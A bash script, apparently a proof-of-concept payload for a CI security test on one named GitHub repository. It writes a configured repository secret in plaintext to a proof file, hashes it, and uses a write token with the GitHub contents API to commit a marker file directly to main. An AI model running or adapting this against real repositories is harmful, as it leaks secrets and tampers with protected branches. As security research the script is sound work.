#!/usr/bin/env bash
set -euo pipefail

printf 'EXECUTION_MARKER=H019_CONFIGURED_SECRET_AND_MAIN_WRITE_PROOF\n'
test "$GITHUB_REPOSITORY" = 'Alardiians/h019-secret-main-proof-20260923'
test -n "${H019_TEST_REPO_SECRET:-}"
test -n "${H019_WRITE_TOKEN:-}"

mkdir -p proof
printf 'H019_TEST_REPO_SECRET=%s\n' "$H019_TEST_REPO_SECRET" > proof/receiver-secret.txt
printf 'PAYLOAD_SECRET_SHA256=%s\n' "$(printf '%s' "$H019_TEST_REPO_SECRET" | sha256sum | cut -d' ' -f1)"

api="https://api.github.com/repos/${GITHUB_REPOSITORY}"
marker_path='proof/main-marker.txt'
expected_blob="$(git hash-object "$marker_path")"
get_status="$(curl --silent --show-error --output "$RUNNER_TEMP/h019-main-before.json" --write-out '%{http_code}' \
  --header "Authorization: Bearer ${H019_WRITE_TOKEN}" \
  --header 'Accept: application/vnd.github+json' \
  --header 'X-GitHub-Api-Version: 2022-11-28' \
  "${api}/contents/${marker_path}?ref=main")"
printf 'H019_MAIN_READ_STATUS=%s\n' "$get_status"
test "$get_status" = 200
remote_blob="$(jq -r '.sha' "$RUNNER_TEMP/h019-main-before.json")"
test "$remote_blob" = "$expected_blob"

marker="$(printf 'H019_MAIN_MARKER=outside-payload-run-%s\n' "$GITHUB_RUN_ID" | base64 -w0)"
put_body="$(jq -n --arg message 'Replace only inert H019 main marker' --arg content "$marker" --arg sha "$remote_blob" \
  '{message:$message,content:$content,sha:$sha,branch:"main"}')"
put_status="$(curl --silent --show-error --output "$RUNNER_TEMP/h019-main-after.json" --write-out '%{http_code}' \
  --request PUT \
  --header "Authorization: Bearer ${H019_WRITE_TOKEN}" \
  --header 'Accept: application/vnd.github+json' \
  --header 'X-GitHub-Api-Version: 2022-11-28' \
  --header 'Content-Type: application/json' \
  --data "$put_body" \
  "${api}/contents/${marker_path}")"
printf 'H019_MAIN_UPDATE_STATUS=%s\n' "$put_status"
test "$put_status" = 200
printf 'H019_MAIN_COMMIT_SHA=%s\n' "$(jq -r '.commit.sha' "$RUNNER_TEMP/h019-main-after.json")"
